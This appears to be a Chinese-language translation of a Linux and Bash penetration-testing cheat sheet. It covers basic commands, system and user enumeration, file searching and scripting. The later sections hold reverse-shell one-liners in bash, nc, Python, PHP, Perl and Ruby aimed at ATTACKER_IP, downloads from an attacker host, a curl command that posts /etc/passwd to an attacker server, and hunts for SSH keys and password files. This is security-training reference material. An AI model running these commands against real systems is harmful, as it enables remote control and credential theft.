# 🐧 Linux 命令与 Bash——渗透测试完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

## 📋 目录

- [目录导航与文件操作](#-navigation--files)
- [系统枚举](#-system-enumeration)
- [用户枚举](#-user-enumeration)
- [网络命令](#-network-commands)
- [文件搜索与分析](#-file-search--analysis)
- [文本处理](#-text-processing)
- [权限与所有权](#-permissions--ownership)
- [进程管理](#-process-management)
- [软件包管理](#-package-management)
- [Bash 脚本编写](#-bash-scripting)
- [反向 Shell](#-reverse-shells)
- [文件传输](#-file-transfers)
- [单行命令](#-one-liners)

---

<a id="-navigation--files"></a>
## 📁 目录导航与文件操作

### 目录导航

```bash
# 当前目录
pwd

# 切换目录
cd /path/to/dir
cd ..          # 上级目录
cd ~           # 家目录
cd -           # 上一次所在的目录

# 列出文件
ls
ls -la         # 长格式，显示全部文件
ls -lah        # 以易读格式显示大小
ls -latr       # 按时间逆序排列
ll             # ls -la 的别名（原文指多数发行版；实际取决于用户配置）
```

### 文件操作

```bash
# 创建文件与目录
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # 创建父目录

# 复制
cp source dest
cp -r source_dir dest_dir  # 递归

# 移动／重命名
mv source dest
mv oldname newname

# 删除
rm file
rm -r directory            # 递归
rm -rf directory           # 强制删除，不提示确认

# 查看文件
cat file.txt
less file.txt              # 分页查看器
more file.txt
head -n 20 file.txt        # 前 20 行
tail -n 20 file.txt        # 后 20 行
tail -f file.txt           # 持续跟踪更新
```

### 归档与压缩

```bash
# tar
tar -cvf archive.tar files/      # 创建
tar -xvf archive.tar             # 解包
tar -czvf archive.tar.gz files/  # 创建 gzip 压缩归档
tar -xzvf archive.tar.gz         # 解开 gzip 压缩归档

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

<a id="-system-enumeration"></a>
## 🔍 系统枚举

> **译注：** “枚举”指逐项收集系统、用户、服务和网络信息。本文保留不同发行版及年代的工具语法；`ll` 是否可用取决于 shell 别名配置，不能假定每台机器都存在。

### 系统信息

```bash
# 主机名
hostname
hostname -I               # IP 地址

# 操作系统／内核
uname -a                  # 全部信息
uname -r                  # 内核版本
cat /etc/os-release       # 操作系统信息
cat /etc/issue            # 操作系统提示信息
cat /proc/version         # 内核与编译器信息

# 体系架构
arch
uname -m

# 硬件
lscpu                     # CPU 信息
cat /proc/cpuinfo
free -h                   # 内存
df -h                     # 磁盘空间
lsblk                     # 块设备
```

### 环境

```bash
# 环境变量
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# 设置变量
export VAR="value"
VAR="value"
```

### 运行中的服务

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# 检查监听端口
ss -tulpn
netstat -tulpn
```

### Cron 定时任务

```bash
# 用户 crontab
crontab -l

# 系统 crontab
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# 观察 cron 执行（使用 pspy）
./pspy64
```

### 已安装的软件包

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# 查找软件包
dpkg -l | grep package
which binary
whereis binary
```

---

<a id="-user-enumeration"></a>
## 👤 用户枚举

### 当前用户

```bash
# 查看当前身份
whoami
id
id username

# 用户组
groups
groups username

# 权限
sudo -l                   # sudo 权限
cat /etc/sudoers          # sudoers 文件（需要 root 权限）
```

### 全部用户

```bash
# 用户列表
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# 具有可用 shell 的用户
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# 密码哈希（需要 root 权限）
cat /etc/shadow

# 最近的登录信息
last
lastlog
w
who
users
```

### 值得检查的文件

```bash
# SSH 密钥
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# 历史记录
cat ~/.bash_history
cat ~/.zsh_history
history

# 配置文件
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

<a id="-network-commands"></a>
## 🌐 网络命令

### 网络配置

```bash
# IP 地址
ip a
ip addr show
ifconfig

# 路由
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# ARP 表
arp -a
ip neigh
```

### 开放端口与连接

```bash
# 监听端口
ss -tulpn
ss -tlnp                  # 仅 TCP
netstat -tulpn
netstat -ano

# 活动连接
ss -tup
netstat -an | grep ESTABLISHED

# 按端口查找进程
lsof -i :80
fuser 80/tcp
```

### 网络测试

```bash
# Ping
ping -c 4 host

# Traceroute
traceroute host
tracepath host

# DNS 查询
host domain.com
dig domain.com
nslookup domain.com

# 检查端口
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # 仅显示响应头
curl -s http://host       # 静默模式
curl -k https://host      # 忽略 TLS／SSL 证书验证
wget http://host/file
```

### 防火墙

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW（Ubuntu）
ufw status
ufw status verbose

# firewalld（CentOS）
firewall-cmd --list-all
```

---

<a id="-file-search--analysis"></a>
## 🔎 文件搜索与分析

### find 命令

> **大小单位说明：** GNU find 的 `k`／`M` 分别表示 KiB／MiB，并按单位向上取整；所以原文 `-size -1k` 不是一般意义的“小于 1KB”，而只匹配大小为 0 字节的项，参见 [GNU Findutils 手册](https://www.gnu.org/software/findutils/manual/html_node/find_html/Size.html)。

```bash
# 按名称查找
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # 不区分大小写

# 按类型查找
find / -type f -name "*.conf"          # 文件
find / -type d -name "backup"          # 目录

# 按权限查找
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # 所有人可写

# 按所有者查找
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# 按大小查找
find / -size +100M 2>/dev/null         # 大于 100MB（原文单位，实际 M 为 MiB）
find / -size -1k 2>/dev/null           # 小于 1KB（原文简写，实际按 KiB 向上取整）

# 按时间查找
find / -mtime -7 2>/dev/null           # 最近 7 天内修改
find / -atime +30 2>/dev/null          # 超过 30 天前访问

# 查找并执行操作
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### grep（搜索文件内容）

```bash
# 基础搜索
grep "pattern" file
grep -i "pattern" file                 # 不区分大小写
grep -r "pattern" /path/               # 递归
grep -rn "pattern" /path/              # 显示行号

# 反向匹配
grep -v "pattern" file                 # 不匹配的行

# 统计匹配情况
grep -c "pattern" file

# 显示上下文
grep -A 3 "pattern" file               # 后 3 行
grep -B 3 "pattern" file               # 前 3 行
grep -C 3 "pattern" file               # 前后各 3 行

# 正则表达式
grep -E "regex" file                   # 扩展正则表达式
egrep "regex" file

# 多个模式
grep -E "pattern1|pattern2" file
```

### locate 与 which

```bash
# locate（需要 updatedb 更新数据库）
locate filename
updatedb                               # 更新数据库

# which（查找可执行文件）
which binary
whereis binary
type command
```

### 文件分析

```bash
# 文件类型
file filename

# 二进制文件中的字符串
strings binary
strings binary | grep password

# 十六进制转储
xxd file
hexdump -C file

# 哈希
md5sum file
sha256sum file
sha1sum file
```

---

<a id="-text-processing"></a>
## ✂️ 文本处理

### Cut

```bash
# 按分隔符切分
cut -d: -f1 /etc/passwd                # 第 1 个字段，以 : 分隔
cut -d: -f1,3 /etc/passwd              # 第 1 和第 3 个字段

# 按字符位置截取
cut -c1-10 file                        # 第 1–10 个字符
```

### Awk

> **原文示例说明：** `awk` 默认按空白分隔字段，`/etc/passwd` 则以冒号分隔。因此原文 `awk '$3 > 1000' /etc/passwd` 不能直接作为 UID 筛选示例，必须按该文件格式设置字段分隔符（如 `-F:`）。原始命令保留作对照，参见 [GNU awk 字段分隔说明](https://www.gnu.org/s/gawk/manual/gawk.html#Field-Separators)。

```bash
# 输出列
awk '{print $1}' file                  # 第 1 列
awk '{print $1, $3}' file              # 第 1 和第 3 列
awk -F: '{print $1}' /etc/passwd       # 自定义分隔符

# 条件
awk '$3 > 1000' /etc/passwd            # 第 3 个字段 > 1000 的行
awk '/pattern/ {print $1}' file        # 匹配的行

# 内置变量
awk '{print NR, $0}' file              # 行号
awk 'END {print NR}' file              # 总行数
```

### Sed

```bash
# 替换
sed 's/old/new/' file                  # 每行首次出现的位置
sed 's/old/new/g' file                 # 每行全部出现的位置
sed -i 's/old/new/g' file              # 直接修改原文件

# 删除行
sed '/pattern/d' file                  # 删除匹配行
sed '5d' file                          # 删除第 5 行
sed '1,5d' file                        # 删除第 1–5 行

# 输出指定行
sed -n '5p' file                       # 输出第 5 行
sed -n '1,10p' file                    # 输出第 1–10 行
```

### sort 与 uniq

```bash
# 排序
sort file
sort -r file                           # 逆序
sort -n file                           # 按数值
sort -u file                           # 仅保留唯一行
sort -t: -k3 -n /etc/passwd            # 按第 3 个字段

# 去重
uniq file                              # 移除相邻重复行
sort file | uniq                       # 移除全部重复行
uniq -c file                           # 统计出现次数
sort file | uniq -c | sort -rn         # 统计并排序
```

### 其他实用命令

```bash
# 行、词与字节计数
wc -l file                             # 行数
wc -w file                             # 词数
wc -c file                             # 字节数

# 列格式化
column -t file                         # 整理成表格
column -s: -t /etc/passwd              # 自定义分隔符

# tr（字符转换）
echo "HELLO" | tr 'A-Z' 'a-z'          # 转换为小写
cat file | tr -d '\n'                  # 移除换行符

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

<a id="-permissions--ownership"></a>
## 🔐 权限与所有权

### 理解权限

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── 其他用户（r-x = 5）
│ │  └───── 所属组（r-x = 5）
│ └──────── 所有者（rwx = 7）
└────────── 文件类型（- = 普通文件，d = 目录）
```

### Chmod

```bash
# 按数值
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# 符号形式
chmod +x file                          # 添加执行权限
chmod -w file                          # 移除写权限
chmod u+x file                         # 所有者执行权限
chmod g+w file                         # 用户组写权限
chmod o-r file                         # 移除其他用户的读权限

# 递归
chmod -R 755 directory/
```

### Chown

```bash
# 更改所有者
chown user file
chown user:group file
chown -R user:group directory/

# 仅更改所属组
chgrp group file
```

### 特殊权限

```bash
# SUID（设置用户 ID）— 4
chmod u+s file
chmod 4755 file

# SGID（设置组 ID）— 2
chmod g+s directory
chmod 2755 directory

# 粘滞位（Sticky Bit）— 1
chmod +t directory
chmod 1755 directory

# 查找 SUID／SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a id="-process-management"></a>
## ⚙️ 进程管理

### 查看进程

```bash
# 列出进程
ps aux
ps -ef
ps aux | grep process_name

# top（实时）
top
htop                                   # 功能更丰富的交互式版本

# 进程树
pstree
ps auxf
```

### 进程控制

```bash
# 后台／前台
command &                              # 在后台运行
Ctrl+Z                                 # 挂起
bg                                     # 在后台恢复运行
fg                                     # 切换到前台
jobs                                   # 列出作业

# 终止进程
kill PID
kill -9 PID                            # 强制终止
killall process_name
pkill process_name

# nice（调度优先级）
nice -n 10 command                     # 降低优先级
renice 10 -p PID
```

---

<a id="-package-management"></a>
## 📦 软件包管理

### Debian/Ubuntu (apt/dpkg)

```bash
# 更新
apt update
apt upgrade

# 安装
apt install package
dpkg -i package.deb

# 移除
apt remove package
apt purge package                      # 连同配置一起移除

# 搜索
apt search package
apt-cache search package

# 信息
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# 更新
yum update
dnf update

# 安装
yum install package
dnf install package

# 移除
yum remove package

# 搜索
yum search package

# 信息
yum info package
rpm -qa | grep package
```

---

<a id="-bash-scripting"></a>
## 💻 Bash 脚本编写

### 基础语法

```bash
#!/bin/bash

# 变量
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# 命令替换
DATE=$(date)
FILES=`ls -la`

# 读取输入
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### 条件判断

> **语法说明：** 下列比较与文件测试行是相互独立的语法片段，缺少各自的主体和 `fi`，不能作为一个完整脚本直接运行；`condition`、`condition2` 也是占位条件，参见 [Bash 条件结构文档](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html)。

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# 比较（字符串）
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # 为空
if [ -n "$str" ]; then                 # 非空

# 比较（数字）
if [ $num1 -eq $num2 ]; then           # 相等
if [ $num1 -ne $num2 ]; then           # 不相等
if [ $num1 -gt $num2 ]; then           # 大于
if [ $num1 -lt $num2 ]; then           # 小于

# 文件测试
if [ -e file ]; then                   # 存在
if [ -f file ]; then                   # 是普通文件
if [ -d dir ]; then                    # 是目录
if [ -r file ]; then                   # 可读
if [ -w file ]; then                   # 可写
if [ -x file ]; then                   # 可执行
```

### 循环

```bash
# for 循环
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# while 循环
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# C 风格 for 循环
for ((i=0; i<10; i++)); do
    echo $i
done
```

### 函数

```bash
# 定义函数
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# 调用函数
function_name arg1 arg2
```

### 脚本示例

```bash
#!/bin/bash
# 端口扫描器

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

<a id="-reverse-shells"></a>
## 🔌 反向 Shell

### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

> **实现差异：** `nc` 的参数并不跨实现通用。原文 `-e` 表示执行程序的写法只适用于支持该功能的变体；例如 [OpenBSD 当前 nc 手册](https://man.openbsd.org/nc) 中 `-e` 指定的是 TLS 对端证书名称。监听参数组合也应按实际版本核对。

```bash
# 带 -e 的 nc
nc -e /bin/bash ATTACKER_IP PORT

# 不带 -e 的 nc
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### 升级 Shell 交互能力

```bash
# 创建 TTY（终端）
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# 完整交互式 TTY
# 在反向 shell 中：
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# 在攻击方终端：
stty raw -echo; fg
# 在 shell 中：
export TERM=xterm
stty rows 40 cols 150
```

---

<a id="-file-transfers"></a>
## ⬇️ 文件传输

### 从攻击方传输到目标

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# 攻击方：nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64（适合小文件）
# 攻击方：base64 file
echo "BASE64_STRING" | base64 -d > file
```

### 从目标传输到攻击方

```bash
# nc
# 攻击方：nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl（POST）
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# 将输出复制到攻击方并解码
```

### 启动 HTTP 服务器

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

<a id="-one-liners"></a>
## ⚡ 单行命令

### 实用渗透测试单行命令

> **示例范围说明：** 下方 IP 正则只匹配数字与点的结构，不验证每段是否在 0–255 范围。Base64 与十六进制编码示例中的 `echo` 默认加入换行，因此编码结果包含该换行，而给定解码常量没有；所有原始字符串与命令均保持不变。

```bash
# 查找具有 SUID 位的二进制文件
find / -perm -4000 -type f 2>/dev/null

# 查找可写目录
find / -writable -type d 2>/dev/null

# 查找所有人可写的文件
find / -perm -o+w -type f 2>/dev/null

# 查找包含密码的配置文件
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# 查找 SSH 密钥
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# 快速端口扫描
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Ping 主机探测
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# 从文件中提取 IP
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Base64 编码／解码
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# URL 编码／解码
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### 快速参考表

| 用途 | 命令 |
|---------|---------|
| 当前用户 | `whoami` / `id` |
| 系统信息 | `uname -a` |
| IP 地址 | `ip a` / `hostname -I` |
| 开放端口 | `ss -tulpn` |
| 运行中的进程 | `ps aux` |
| 查找 SUID | `find / -perm -4000 2>/dev/null` |
| 可写目录 | `find / -writable -type d 2>/dev/null` |
| 下载文件 | `wget http://url/file` |
| 反向 Shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| 升级 TTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 参考资源

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [反向 Shell 速查表](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### 相关速查表
- [Linux 权限提升](../../Linux-PrivEsc/README.md)
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/translations/README.zh-CN.md)

---

<p align="center">
  <b>🐧 掌握用于渗透测试的 Linux！</b><br>
  <i>命令行是你得力的助手</i>
</p>
